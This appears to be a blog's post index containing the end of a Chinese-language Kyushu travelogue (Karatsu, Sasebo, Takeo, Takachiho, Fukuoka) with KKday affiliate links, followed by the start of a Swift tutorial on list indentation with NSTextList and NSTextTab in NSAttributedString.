寶當棧橋。唐津 KKday 包車行程參考：「【福岡包車一日遊】日本九州福岡縣｜福岡塔、太宰府天滿宮、大濠公園、唐津、櫻井二見浦、呼子朝市、糸島、天神地下街｜行程自由搭配！」下車後往前走一點就是保當棧橋，一路往後走就是唐津城；看到這個前橋後城的景色，這一路奔波都值得了。大約 16:35 抵達這邊，距離唐津城關門只剩 25 分鐘，想說來都來了就去走走。唐津城需要從下面走一段山坡才會到，時間緊迫，直接左轉去旁邊舞鶴公園搭電梯上去。搭乘電梯單趟 100 日圓，從門口販賣機買票交給服務人員即可。天守閣已關閉參觀，上來看看風景跟唐津城而已。在電梯關門前回到入口，順路照著觀光地圖徒步回 JR 唐津站。走石垣道先去唐津神社。(路上人煙稀少、荒涼)唐津神社(超過 17:00 已休息)、舊唐津銀行( 與東京車站同位建築設計師 — 辰野金吾 )。車站附近就是 曳山展示場 (超過 17:00 也休息了)，只能在車站看看小型的模型。 到唐津站就搭 JR 回博多(天神南)了；出站遇到問題，因為是 JR 唐津站入站，地鐵天神南出站，站務員不認 JR Pass 要求補整段(JR 唐津到天神南)的票 QQ。博多正下著大雨(雨神發威)，在天神地下街隨便買個天神地下街飯糰當晚餐就拖著行李前往飯店了。 這家 APA 空間比較大，不過整體設備都很古老，也是我第一次住到不是一體式衛浴的 APA、並且無泡湯浴場、智慧整合 (查看洗衣機、Airplay…)。點心是草莓冰沙、宵夜是超商炸雞、秋雅(好甜)。結束漫長的一天。Day 7 佐世保 (九十九島)、武雄溫泉早上陰天，也來到 JR Pass 的最後一天，沒辦法更改行程，只能繼續搭上前往佐世保的列車。JR 車程大約一個半小時，錄了一下段 JR 九州車內廣播作為回憶。最後一段 早岐 到 佐世保 會倒著開(約 10 分鐘)，如果怕暈車可用腳擋切換椅子的面向。出佐世保站之後過馬路到對面再往後面走找到 6 號站牌，往「九十九島水族館」。轉搭公車到九十九島水族館站下車後約走 5 分鐘就能到九十九島遊覽船遊客中心，就能買票搭船了。(出示 JR Pass 有折扣) KKday 線上購票： 日本九州長崎|九十九島遊覧船 船票九十九島遊覽船九十九島官網資訊這次搭乘的是 11:00 左邊這艘白色的珍珠皇后號。大雨，天候不佳，當不成航海王，只能撐著傘吹著風淋著雨。 船上有中英日韓介紹廣播、航程約 50 分鐘、有廁所、販賣部。 船艙外可以上到甲板、鳥望台，但當天雨大風大就沒上去了。 船穿過兩座島嶼中間時風會特別大，要小心。船艙內有座位。結束大雨中沒看到什麼東西的遊覽後就一路返回佐世保了。回程路上順路去 蜂之家 品嚐佐世保名產檸檬牛排。檸檬牛排就是四片牛排薄片＋醬汁＋檸檬片＋檸檬汁，口感清爽、肉量稍微不足。吃完又再點了另一個名物水果泡芙，裡面餡料豐滿，有真的水果切塊在裡面。吃完去商店街晃了一下就搭公車回車站了。搭往回(博多、武雄溫泉)方向的列車，這邊是底站所以要等清潔人員清潔完畢才能上車；跟來的時候一樣 早岐 到 佐世保 會倒著開。此時時間約 13:30。 佐世保還能去豪斯登堡，但我沒有特別安排要去。 KKday 佐世保參考行程： 日本長崎|九州豪斯登堡門票 Huis Ten Bosch 日本長崎|佐世保 SASEBO 軍港遊艇之旅 【佐世保 】岸上觀光|名勝世界壹號 Resorts World One 九十九島水族館海吉良入場券+珍珠串珠體驗(附珍珠) (長崎縣佐世保市)武雄溫泉 KKday 行程參考：「九州佐賀一日遊｜祐徳稲荷神社・嬉野溫泉・御船山樂園・武雄圖書館＆武雄神社／鳥栖精品暢貨中心（TOSU PREMIUM OUTLETS）｜福岡博多出發」上次去長崎經武雄溫泉換車，對這站沒什麼印象，後來有追蹤 武雄市的觀光 IG （官方會定期舉辦活動，例如免費螢火蟲接駁，有要去武雄泡溫泉住宿的可以關注。）這次想說剛好路過＋有時間就去看看。從武雄車站(無人車站，JR Pass 不需投入、直接出站)，出來街道上也人煙稀少、很安靜。只是路過走馬看花，就只去查到的主要景點，剛好是對角，公車班次不多、不想等，所以直接用走的。先去武雄神社，路上會經過塚崎大楠樹，一個小景點。塚崎大楠樹，樹齡推估 2,000 年。武雄神社從下要走一小段樓梯往上到武雄神社。武雄神社旁邊穿過御神木鳥居再往後走約 5 分鐘就能看到傳說中的武雄大楠樹。(樹齡推估 3,000 年)武雄大楠樹有圍起來，只能遠觀。買了一個武雄神社大楠守(1,500 日圓)，尺寸較大＋木盒。武雄神社參拜完就往回走去看另一邊蓬萊湯門樓。 整條溫泉街都沒人，有好幾家溫泉、住宿飯店可以選擇(不一定要蓬萊湯)，感覺如果有要來九州泡湯想要人少寧靜＋交通方便，武雄溫泉是個很好的選擇！蓬萊湯門樓到此一遊。進門樓之後就是蓬萊湯泡湯的，另一邊還有溫泉住宿鷺乃湯。武雄市觀光地圖，查資料有查到御船山樂園看起來不錯，但此時已差不多 15:30，來不及去了。搭乘往博多的特急，約 18:00 回到博多。漫步回飯店，晚餐超商隨意解決，御飯糰、豬排三明治、 不二家桃子氣泡飲(好喝！！) ；住了那麼多次 APA、東橫 Inn 才發現都有製冰機，太爽啦！扣除掉設備舊，這家 APA 的房間大小、景觀真的不錯。Day 8 櫻井二見浦 夫婦岩、南藏院、博多巡禮已無 JR Pass。 KKday 包車行程參考：「【福岡包車一日遊】日本九州福岡縣｜福岡塔、太宰府天滿宮、大濠公園、唐津、櫻井二見浦、呼子朝市、糸島、天神地下街｜行程自由搭配！」櫻井二見浦 夫婦岩一早換完飯店後搭乘 JR 到九大學研都市站。出站左手邊就是「 西之浦線 」月台也有工作人員指引，搭乘時間約 30 分鐘。車資是我搭過最高的公車車資，730 日圓。下車後就是 櫻井二見浦 夫婦岩。近看很美、很寧靜。 這邊結束之後可以再往後去櫻井神社(據說因為跟日本團體嵐成員名字一樣，會有很多歌迷去朝聖)或再往後去 芥屋大門觀光船 (看起來很酷！) 。回程時刻表，直達博多的下午每小時一班、回 九大學研都市站 每小時一班。回到博多大約中午 12:30，先來去覓食。再訪 ハカタミヤチク (日本一宮崎牛専門店 博多みやちく) 品嚐宮崎牛商業午餐。商業午餐 CP 值超高(晚上是高級燒肉套餐料理)＋社恐人天堂獨立包廂。這次點瘦肉套餐 200g 3,200 日圓，狂嗑了兩碗白飯(飯湯免費續)。南藏院回博多後搭火車前往南藏院前站。出站一路走出來，經過荒神茶屋(可以在此休憩、吃午餐)，過馬路就會到南藏院入口。 走右邊參觀臥佛，左邊也有求姻緣、平安、不動明王雕像。 南藏院是私人院所並因也有供奉塔位，所以規定跟禁止拍照的地方比較多，需要遵守。禁止短袖短褲露肚露肩、播音樂、跳舞、攝影(如：入口山洞整排牌位、不動明王像)來打平台後就能看到臥佛本尊，腳底有經文，整體很壯觀莊重。參觀完畢後就搭火車又回到博多站了，約 15:40 抵達博多站。博多巡禮補一些 上次九州沒去到的地點 。祇園 — 東長寺東長寺二樓有福岡大佛可以參拜(50 日圓)。參拜完離晚餐 17:00 鐵鍋煎餃 鉄なべ 營業還有一個小時，再去大濠公園逛逛。大濠公園大濠公園很大，走一圈大概要 45 分鐘；可以踩天鵝船。福岡市美術館週一沒有營業，只能遠觀草間彌生南瓜。走完逛完時間差不多 17:00，可以去吃晚餐了！鐵鍋煎餃 鉄なべ上次來吃過一次 鐵鍋煎餃 鉄なべ 還懷念那脆脆煎餃味道。 他有另一家 分店 — 鐵鍋煎餃 鉄なべ 博多 祇園店 ，前幾天路過大門深鎖，貼了一張公告說整修中，請前往本店。(但是 Google Map 仍然顯示有營業) 醬料、水自助。 店家不支援電子支付，只收現金。 ⚠️大約 17:20 看大家在外面等，沒多久，店員阿嬤就出來招呼可以進去了。這次 知道要點兩份煎餃了，上次阿嬤比手畫腳說 1 份吃不飽(那時候不懂)，1 份 8 顆 (500 日圓)、兩份 16 顆，再點一杯生啤結束這回合！煎餃都是現點現煎，上來還會滋滋滋，皮薄很脆，內餡應該是韭菜豬肉，單純不鹹又很有食材本身的味道。吃完 18:00 出來就開始有一些人在排隊等候了。吃飽走回飯店，路過正在準備的中洲屋台，這次來發現多好多共享單車。 這次一直換飯店，好累；這是最後三天的飯店。點心冰淇淋、宵夜是超商熱狗。Day 9 KKDAY 高千穗一日遊，高千穗神社、高千穗峽谷、天岩戸神社、天安河原直接跟「【一人成團，每日出團】日本九州一日遊｜高千穗峽＆天岩戸神社＆天安河原（含特色阿蘇赤牛烤肉套餐）｜福岡出發」行程。 其他地點出發(熊本)或搭配其他景點(阿蘇、南阿蘇、白川水源)，可參考 KKday 其他行程。早上 07:45 前往 博多車站築紫口 (博多後站)在 LAWSON（羅森）博多站筑紫口店 前廣場找到要去的目的地的一日遊行程導遊。(同時間會有好幾團，有 KKDAY 自己帶隊的、EasyGo的、要去高千穗的、由布院的…等等)導遊(中文)手上有名單，完成報到後會跟你說車號，記好車號就能直接上車了。 位子先到先坐，如果有特殊情況(易暈車)可以跟導遊說。08:00 人到齊發車 導遊自我介紹(石楠)、中英日文 行程介紹，導遊說高千穗一日遊是全部一日遊方案裡最遠的最辛苦的ＸＤ 車上有 WiFi (不過不太穩) 隨時係好安全帶 ⚠️ 大部分是台灣人 介紹高千穗神社、調查有無人有預約划船 到第一個高千穗神社約需 3 小時關於高千穗划船 高千穗划船需要提前三天預約，每個時段名額有限 ⚠️ 高千穗划船需要提前三天預約，每個時段名額有限 ⚠️ 高千穗划船需要提前三天預約，每個時段名額有限 ⚠️划船路程不長，來回應該 30–45 分鐘就結束，約 12:00 會吃完午餐、高千穗行程約 13:20 結束，要重新集合返回。我們這團有 3 組人有預約。 因此若要搭配一日遊預約划船，12:00 / 12:30 會是比較適合的時間點。 ⚠️吃完午餐會需要徒步前往高千穗峽谷，如果有預約划船或是自己覺得體力無法負荷的，導遊有安排接駁車直達，節省時間。 實際還是以 KKDAY 安排為主，建議預約前先詢問官方，確保沒有問題。 ⚠️9:20 休息站休息因車程較長，途中會在休息站休息 10 分鐘讓大家上廁所動動筋骨。10:50 抵達高千穗神社高千穗神社整個被神木包圍著，整體透露著寧靜、清新。夫婦杉 ，導遊在車上的時候有說，如果是跟家人、夫妻、情侶、朋友來可以手牽手繞樹三圈，祈福。約 11:20 回到集合回車上。11:30 午餐 高千穗料理 神樂宿參拜完高千穗神社先去附近吃午餐。需拖鞋，整體很像是專門接待團體觀光客的日式餐廳，但我也是第一次體驗日式餐廳。餐點整體普通偏下，可能是因為團體人多，大部分都冷掉、肉質吃起來也普普。12:15 開始徒步到高千穗峽谷 (一路下山)吃飽飯後一路往下跟著導遊徒步到高千穗峽谷。大約走 20 分鐘的步道就能看到高千穗峽谷，從這個角度可以看到峽谷尾部(划船終止線)。12:45 抵達高千穗峽谷從高千穗峽這邊的橋看回去剛剛走來的古道跟下方的船。划船場，過橋下去就是了，總長(到剛剛看到的停止線)我覺得差不多 250 公尺。有個小公園、商店街，可以吃吃冰或點心補充體力。13:20 重新集合回遊覽車約 13:45 抵達天岩戶神社西本宮 (看資訊櫻花季會有其他行程)下遊覽車後走約 5 分鐘到 天岩戶神社西本宮，商店街商家門口會懸掛不同的神面具。導遊會補充在遊覽車上有介紹的天照大神的故事。去天安河原也要走一小段，導遊跟大家約定一起先走到天安河原後大家再自行返回，可以盡情參觀 (或直接跟著導遊返回)。約 14:00 徒步前往天安河原約 14:15 抵達天安河原天安河原山洞，就是天照大神曾經躲起來的地方；神社鳥居周圍堆滿了參拜者留下來的石頭。參拜完回到來的路上有經過的冰店。大家都在這排隊滿冰淇淋，也一起嘗試了宮崎本地芒果冰淇淋(900 日圓)，導遊說宮崎芒果很高級，不過老實說還是台灣的芒果比較有芒果味。休息完慢慢走回參拜天岩戶神社。約 15:10 集合回程去完最後一個行程之後已下午三點多，要開始回程了(依然是三小時車程回福岡)。約 16:40 停靠休息站回程同樣會在中途停靠休息站讓大家上廁所活動活動。約 18:00 多回到 博多車站築紫口 (博多後站)行程順利結束，謝謝石楠的帶領與行程安排👏👏👏👏👏。晚餐隨便買了超商熱狗、前幾天 Day 6 有吃過的天神地下街飯糰，新的葡萄口味 Suntory 好喝！！點心再嗑了一個 BRULEE。晚安。Day 10 博多逛街、天神逛街、PayPay Dome 看棒球九州景點行程差不多告一段落了，剩下接近兩天的逛街購物行程。早上先去唐吉訶德(24 hr) 簡單採買， 天神本店 很大間，有好幾層可以逛。接近中午去博多站百貨公司晃晃、買伴手禮、福岡產的清酒、福砂屋長崎蛋糕、小倉名月米果…等等下午回到天神周邊、天神地下街、Le Labo、岩田屋百貨、三井百貨…等等(天神這邊一堆百貨公司)。Le labo Another 13 剛好噴完補貨，這次買 50ml (退完稅約 $5,800 台幣)。在天神 C-pla 扭了一個有趣的公車下車按鈕ＸＤ按了會有聲音ＸＤ。提著戰利品回飯店休息，吃個熱狗跟甜品還有 日本必喝！生可樂！博多運河城休息一下之後重新出門，16:30 抵達博多運河城。主要是去他 B1 的超大扭蛋百貨。https://gofukuoka.jp/zh-tw/spots/detail/196050逛完前往博多站。大約 17:30 到博多站搭公車去 PayPay Dome，晚上 18:00 看棒球比賽。Fukuoka SoftBank Hawks 福岡軟銀鷹 比賽 @ 福岡 PayPay Dome 球場 今天的對戰組合是：Fukuoka SoftBank Hawks 福岡軟銀鷹 v.s. Tokyo Yakult Swallows 東京養樂多燕子一些入場規定提醒 ： 需要打開背包過安檢、不能自己帶吃的，可以帶一瓶茶水飲料、不能自己帶酒、裡面有賣酒水食物、出去再入場記得領再入場許可券福岡軟體銀鷹隊的吉祥物就叫 Harry，當然要來看球支持一下。上次坐在比較貴的內野本壘區 ，這次想說坐最便宜的來體驗氛圍就好，本來以為有自由席，結果是全部指定席，就挑了一個外野側最後一排靠邊邊方便進出的位置了(外野這邊的椅子沒椅背，好處是比較好跨越進出)。不的不佩服日本的職業運動風氣，平日、晚上 18:00 球場座位約 40,000 個，幾乎滿場，再選位子的時候都沒有整排空的或靠邊邊角落的位子。視野、距離跟上次比就差很多了。這次大比分落後，終場以 9:3 戰敗結束，沒有煙火可以看，但也見識到兩隊的應援活動。(福岡軟體銀鷹隊的氣球應援跟東京養樂多燕子隊的雨傘舞應援)大約 7 局打完就已經 9:1，大家就開始陸續離場了，我也沒看到最後。公車站一樣排滿人，跟上次一樣跟著人群走路回到地鐵唐人町站。(約 15 分鐘)回飯店休息前，刻意在走道中洲屋台看離開福岡前的最後一眼夜景。宵夜，日清咚兵衛豆皮泡麵(這次來那麼多天才第一次吃)、大分產的水果酒、超商雞油炸雞(Juicy 好吃)。Day 11 Lalaport、博多逛街、天神逛街、回程不知不覺出國 11 天了，已開始想念台灣的美食，晚上 21:00 的飛機還有很多時間可以亂逛。https://toyscabin.com/product/20221201_546.php主要的伴手禮都買好、裝好行李了，今天就純粹亂逛找電車發車這個扭蛋。(最終沒找到，參考 廠商提供的店家 ，市區的都售罄了)Lalaport早上沒事先去逛 Lalaport。(10 點營業)一樓超市有一台西鐵公車改裝的飲料櫃，很酷ＸＤ。主要是來三樓 ガチャガチャの森 跟一樓手扶梯下的 Pon! 看有沒有我要找的扭蛋。(沒有)時間接近 11 點，沒吃早餐很餓，就在三樓美食街吃海鮮天婦羅蓋飯解決(覺得很鹹)。再回到一樓買如水庵的草莓大福解膩。找不到要找的扭蛋就離開 Lalaport 回博多站，1010 裡面也有 Pon! 同樣沒有。去 博多 Yodobashi 的扭蛋區域找也沒找到。博多失利之後回到天神地區的扭蛋店尋找，同樣沒有收穫。最後放棄，去逛逛樓上的 Animate、Kiddy Land（有超多 IP 的周邊）時間大約來到下午 16:00，快要結束這次旅行了，最後坐在客美多咖啡吃個甜點跟咖啡休息。約 17:00 回飯店拿行李，慢慢往福岡機場移動，本來以為下午五點多地鐵人會很多，其實也沒什麼人。從天神南走到天神蠻遠的，拖著行李大概需要 15 分鐘。搭乘機場線到福岡機場站(國內線)之後還要轉機場接駁車(免費)到國際航站樓。接駁車班次蠻密集的，大約 5–10 分鐘一班，路程大約 10 分鐘，下車還要再走到 3F 出境大廳；保守抓的話機場線地鐵出來還要 +30 分鐘才會真的到國際線機場大廳。福岡機場正在整修，比較混亂。到機場的時間還太早，櫃檯還沒開放，地勤人員指引我們先去 1 自助報到再去 2 自助托運行李，他們會從旁協助；很快就完成行李託運了(這次才 17 Kg)。大約 18:30 就開始候機了。福岡機場出境的候機廳是狹長型的，人很多很多，非常混亂擁擠。(不知道是不是因為還在整修跟太多航班等待起飛的關係)。精品、化妝品免稅店蠻完整的，店員也都會中文；伴手禮店也有(這裡就有福砂屋長崎蛋糕)；菸酒類免稅店只有一家要排隊、吃的跟超商更不用說了，直接排爆。 前一班 CI129 19:10 的特別公告請大家遵守華航只能攜帶一件隨身行李的規定，超過要加購(這班看起來滿座)。⚠️後面覺得這邊太吵混亂，就往 501–504 北邊走，這邊沒什麼人；也有家咖啡廳簡餐店可以吃東西。簡單買個豬排三明治跟去投幾罐生可樂、桃子水帶回台灣。約 20:30 開始登機，這班沒有特別檢查手提行李一件的規定(但我早就全塞成一件了…)，21:00 準備起飛，21:09 起飛，飛機是 A330–300 設備比較舊。再見九州、再見日本，飛機餐是薑味豬肉炒麵，不怎麼樣，但水果有哈密瓜！一路遇到亂流很顛波，搖搖晃晃順利降落台灣，時間延誤了快 30 分鐘，接近 23 點才到。(表定 22:25)因為怕趕不上公共交通一路狂奔，機捷沒趕上但還好最後趕上客運，不然又要坐不太安全的白牌計程車回台北了。1819 路線 ，我的神，到北車車程約 55 分鐘。 中途停靠站如上圖，若是要在中途下車的要跟司機大哥提前在上行李的時候說，他會分開放，不然北車下車的會統一放一起，如果要中途下會無法拿行李。⚠️6/14 00 點多，回到溫馨的家，結束這趟 11 天的旅程。每日步行平均都在 2 萬步上下，最高走到 27,000 步。戰利品右邊那盒漏拍了，是在博多站百貨公司商品街試吃到覺得好吃的蝦餅。日本各地搜集來的小物這次新增七大福中的四尊、迷你啤酒、高千穗(狗)戌年御守。背景報紙是買 Le Labo 送的。最後，感謝您閱讀我的旅遊記錄；也感謝這次同行的夥伴 James。下次旅遊的靈感 東南亞 南九州鹿兒島降落 -&gt; 大分 -&gt; 向日葵號郵輪 -&gt; 神戶 -&gt; 姬路城 -&gt; 天橋立 -&gt; 名古屋機場回來 東北地區、仙台KKday 推廣 日本 JR PASS｜九州地區鐵路周遊券｜北九州＆南九州＆全九州｜電子票 日本長崎|九州豪斯登堡門票 Huis Ten Bosch 日本福岡|博多港ー釜山港・客貨郵輪「新山茶花號」Camellia Line 日本eSIM卡｜每日高速、總量、無限流量吃到飽方案 福岡西鐵｜太宰府 天滿宮+柳川遊船 觀光暢遊套票｜福岡機場國際線領取 日本福岡teamLab Forest 福岡門票 — SBI 證券｜立即確認 【一人成團】日本九州一日遊｜高千穗峽＆天岩戸神社＆天安河原（含特色阿蘇赤牛烤肉套餐）｜福岡出發 九州熊本一日遊｜阿蘇中岳火山・草千里・熊本城・水前寺成趣園／季節水果吃到飽｜福岡博多出發（中英日對應） 如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝。更多遊記 [遊記] 2024 山陰地區( +關西) 島根鳥取姬路大阪 7 日獨旅自由行 [遊記] 2023 九州 10 日自由行獨旅 ⭐️ (九州上篇) [遊記] 2023 廣島岡山 6 日自由行 [遊記] 9/11 名古屋一日快閃 [遊記] 2023 東京 5 日自由行 [遊記] 2023 京阪神 8 日自由行有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝： Follow Me on Medium 981+ Followers 4,026 Total Views Last Statistics Date: 2025-01-19 | 3,969 Views on Medium. " }, { "title": "iOS NSAttributedString 探究使用 NSTextList 或 NSTextTab 實現列表縮排", "url": "/posts/2981dc0fcd58/", "categories": "ZRealm Dev.", "tags": "ios-app-development, nsattributedstring, swift, layout, uikit", "date": "2024-06-01 22:43:49 +0800", "snippet": "[iOS] NSAttributedString 探究使用 NSTextList 或 NSTextTab 實現列表縮排iOS Swift 使用 NSAttributedString 的 NSTextList 或 NSTextTab 實現類似 HTML List OL/UL/LI 列表縮排功能技術背景之前在開發我的開源專案「 ZMarkupParser 」一個用於轉換 HTML String ...", "content": "[iOS] NSAttributedString 探究使用 NSTextList 或 NSTextTab 實現列表縮排iOS Swift 使用 NSAttributedString 的 NSTextList 或 NSTextTab 實現類似 HTML List OL/UL/LI 列表縮排功能技術背景之前在開發我的開源專案「 ZMarkupParser 」一個用於轉換 HTML String 成 NSAttributedString 物件的 Library，需要研究、實現單純使用 NSAttributedString 實現不同 HTML 組件，那時候才接觸到 NSAttributedString Attributes 的 .paragraphStyle: NSParagraphStyle 中的 textLists: [NSTextList] 與 tabStops: [NSTextTab] 屬性，是兩個非常冷門的屬性，網路資料稀少。當初在實現 HTML 列表縮排轉換時，就查到範例可以使用這兩個屬性來達成，先來看一下 HTML 列表縮排巢狀標籤結構：&lt;ul&gt; &lt;li&gt;ZMarkupParser is a pure-Swift library that helps you convert HTML strings into NSAttributedString with customized styles and tags.&lt;/li&gt; &lt;li&gt;ZMarkupParser is a pure-Swift library that helps you convert HTML strings into NSAttributedString with customized styles and tags.&lt;/li&gt; &lt;li&gt; ZMarkupParser is a pure-Swift library that helps you convert HTML strings into NSAttributedString with customized styles and tags. &lt;ol&gt; &lt;li&gt;ZMarkupParser is a pure-Swift library that helps you convert HTML strings into NSAttributedString with customized styles and tags.&lt;/li&gt; &lt;li&gt;ZMarkupParser is a pure-Swift library that helps you convert HTML strings into NSAttributedString with customized styles and tags.&lt;/li&gt; &lt;li&gt;ZMarkupParser is a pure-Swift library that helps you convert HTML strings into NSAttributedString with customized styles and tags.&lt;/li&gt; &lt;/ol&gt; &lt;/li&gt;&lt;/ul&gt;在瀏覽器中的顯示效果：如上圖所示，列表支援多層巢狀結構，並且需要照層級縮排。那時候因為還有許多其他 HTML 標籤轉換的工作需要實現，工作量很大；只快速嘗試用 NSTextList or NSTextTab 組合出列表縮排，沒有深入了解；但結果不如預期，間距過大、沒有對齊、多行會跑掉、巢狀結構不明顯、無法控制間距，稍微玩了一下試不出解答就放棄，暫時用土炮方式排版：如上圖效果很差，因為其實是自己用空白跟符號 － 手動排版， 無縮排效果 ，唯一好處只有間距是空白符號組成，大小可以自己控制。這件事就這樣不了了之了，開源了一年多也沒特別去改他；直到最近陸續收到希望能完善 List 轉換的 Issues 並且有開發者提供 解法 PR ，參考該 PR 中的 NSParagraphStyle 使用方式，才讓我又重新有了新的啟發；研究好 NSTextList 或 NSTextTab 是有機會完美實現縮排列表功能的！最終成果照慣例先上最終成果圖。 現在已可以在 ZMarkupParser ~&gt; v1.9.4 以上版本，完美轉換 HTML List Item 成 NSAttributedString 物件。 支持換行保持縮排 支持自訂縮排間距大小 支持巢狀結構縮排 支持不同 List Item Style 列表樣式，如 Bullet, Disc, Decimal…甚至客製化符號 以下正文開始。NSTextList 或 NSTextTab 實現列表縮排方法探究是「或」不是「與」 NSTextList 和 NSTextTab 沒有一起使用的關係，兩個屬性個別都能實現列表縮排功能。方法(1) 使用 NSTextList 實現列表縮排方法探究let listLevel1ParagraphStyle = NSMutableParagraphStyle()listLevel1ParagraphStyle.textLists = [textListLevel1] let listLevel2ParagraphStyle = NSMutableParagraphStyle()listLevel2ParagraphStyle.textLists = [textListLevel1, textListLevel2] let attributedString = NSMutableAttributedString()attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel1.marker(forItemNumber: 1))\\tList Level 1 - 1 StringStringStringStringStringStringStringStringStringStringStringString\\n\", attributes: [.paragraphStyle: listLevel1ParagraphStyle]))attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel1.marker(forItemNumber: 2))\\tList Level 1 - 2\\n\", attributes: [.paragraphStyle: listLevel1ParagraphStyle]))attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel1.marker(forItemNumber: 3))\\tList Level 1 - 3\\n\", attributes: [.paragraphStyle: listLevel1ParagraphStyle]))attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel2.marker(forItemNumber: 1))\\tList Level 2 - 1\\n\", attributes: [.paragraphStyle: listLevel2ParagraphStyle]))attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel2.marker(forItemNumber: 2))\\tList Level 2 - 2 StringStringStringStringStringStringStringStringStringStringStringString\\n\", attributes: [.paragraphStyle: listLevel2ParagraphStyle]))attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel1.marker(forItemNumber: 4))\\tList Level 1 - 4\\n\", attributes: [.paragraphStyle: listLevel1ParagraphStyle])) textView.attributedText = attributedString顯示效果：NSTextList 提供的 Public API 非常稀少，能控制的參數也就這些：// 項目顯示樣式var markerFormat: NSTextList.MarkerFormat { get }// 有序項目數字起始，從幾開始var startingItemNumber: Int// 是否為有序數字項目 (iOS &gt;= 16 才可用，這 API 居然有在更新)@available(iOS 16.0, *)open var isOrdered: Bool { get }// 回傳項目符號字串，itemNumber 帶入項目編號，如果為非有序數字項目則可省略open func marker(forItemNumber itemNumber: Int) -&gt; StringNSTextList.MarkerFormat 樣式對照： 為增加識別度，以項目列表位置 8 展示。使用方式：// 定義一個 NSMutableParagraphStylelet listLevel1ParagraphStyle = NSMutableParagraphStyle()// 定義 List Item 樣式, 項目起始位置let textListLevel1 = NSTextList(markerFormat: .decimal, startingItemNumber: 1)// 賦予 NSTextList 到 textLists ArraylistLevel1ParagraphStyle.textLists = [textListLevel1]//NSAttributedString(string: \"\\t\\(textListLevel1.marker(forItemNumber: 1))\\項目一\\n\", attributes: [.paragraphStyle: listLevel1ParagraphStyle])// 增加巢狀子項目：// 定義子項目 List Item 樣式, 項目起始位置let textListLevel2 = NSTextList(markerFormat: .circle, startingItemNumber: 1)// 定義子項目 NSMutableParagraphStylelet listLevel2ParagraphStyle = NSMutableParagraphStyle()// 賦予 母,子 NSTextList 到 textLists ArraylistLevel1ParagraphStyle.textLists = [textListLevel1, textListLevel2]NSAttributedString(string: \"\\t\\(textListLevel1.marker(forItemNumber: 1))\\項目一之一\\n\", attributes: [.paragraphStyle: listLevel2ParagraphStyle])// 巢狀子項目的子項目...繼續 append NSTextList 到 textLists array 即可 使用 \\n 區別每個列表項目 使用 \\t項目符號\\t ，目的是讓 attributedString.string 存取純文字字串時也能得到列表結果。 \\t項目符號\\t 不會顯示出來，因此在項目符號後做什麼加工都不會顯示 (e.g. 例如加上 . ，並不會影響顯示)使用上的問題： 無法控制項目符號左右間距大小 無法客製化項目符號、數字項目無法加上 . -&gt; 1. 有發現若母項目列表是非有序項目 (如： .cicrle )，子項目是有序數字項目 (如： .decimal ) 時，子項目的 startingItemNumber 設定會失效NSTextList 能做的、可以做的就如同上述，在實際產品開發應用上並不是那麼的好用；間距太寬、數字項目沒有 . 大大減少實用性，網路上也只找到 透過 TextKit NSTextStorage 改變間距 的方式，我覺得這方式太 hard-coding 了，放棄；唯一好處是可以間單的透過 Append textLists array 增加巢狀縮排子項目列表，不需要計算複雜的排版問題。方法(2) 使用 NSTextTab 實現列表縮排方法探究NSTextTab 可以讓我們設定 \\t Tab 的佔位 位置 ，預設間隔為 28 。我們透過設定 NSMutableParagraphStyle 的 tabStops + headIndent + defaultTabInterval 來達成仿項目列表的效果。let textListLevel1 = NSTextList(markerFormat: .decimal, startingItemNumber: 1)let textListLevel2 = NSTextList(markerFormat: .circle, startingItemNumber: 1) let listLevel1ParagraphStyle = NSMutableParagraphStyle()listLevel1ParagraphStyle.defaultTabInterval = 28listLevel1ParagraphStyle.headIndent = 29listLevel1ParagraphStyle.tabStops = [ NSTextTab(textAlignment: .left, location: 8), // 對應設定如圖 (1) Location NSTextTab(textAlignment: .left, location: 29), // 對應設定如圖 (2) Location] let listLevel2ParagraphStyle = NSMutableParagraphStyle()listLevel2ParagraphStyle.defaultTabInterval = 28listLevel2ParagraphStyle.headIndent = 44listLevel2ParagraphStyle.tabStops = [ NSTextTab(textAlignment: .left, location: 29), // 對應設定如圖 (3) Location NSTextTab(textAlignment: .left, location: 44), // 對應設定如圖 (4) Location] let attributedString = NSMutableAttributedString()attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel1.marker(forItemNumber: 1)).\\tList Level 1 - 1 StringStringStringStringStringStringStringStringStringStringStringString\\n\", attributes: [.paragraphStyle: listLevel1ParagraphStyle]))attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel1.marker(forItemNumber: 2)).\\tList Level 1 - 2\\n\", attributes: [.paragraphStyle: listLevel1ParagraphStyle]))attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel1.marker(forItemNumber: 3)).\\tList Level 1 - 3\\n\", attributes: [.paragraphStyle: listLevel1ParagraphStyle]))attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel2.marker(forItemNumber: 1))\\tList Level 2 - 1\\n\", attributes: [.paragraphStyle: listLevel2ParagraphStyle]))attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel2.marker(forItemNumber: 2))\\tList Level 2 - 2 StringStringStringStringStringStringStringStringStringStringStringString\\n\", attributes: [.paragraphStyle: listLevel2ParagraphStyle]))attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel1.marker(forItemNumber: 4)).\\tList Level 1 - 4\\n\", attributes: [.paragraphStyle: listLevel1ParagraphStyle]))textView.attributedText = attributedString tabStops Array 會對應文本中的每一個 \\t 符號， NSTextTab 可設定 Alignment 方向、Location 位置 ( 請注意不是設定寬度，是文本中中的位置！ ) headIndent 設定第二行開始距離起始點的位置，通常設為第二個 \\t 的 Location，這樣換行才能對齊項目符號。 defaultTabInterval 設定預設 \\t 的 Interval 間距，如果文字中還有其他 \\t 會依照此設定拉開間距。 location: 因為 NSTextTab 是指定方向與位置的，因此需要自行計算出位置；要計算項目符號寬度(位數也會影響) +間距+母項目內縮的距離，才能排出如上圖的效果。 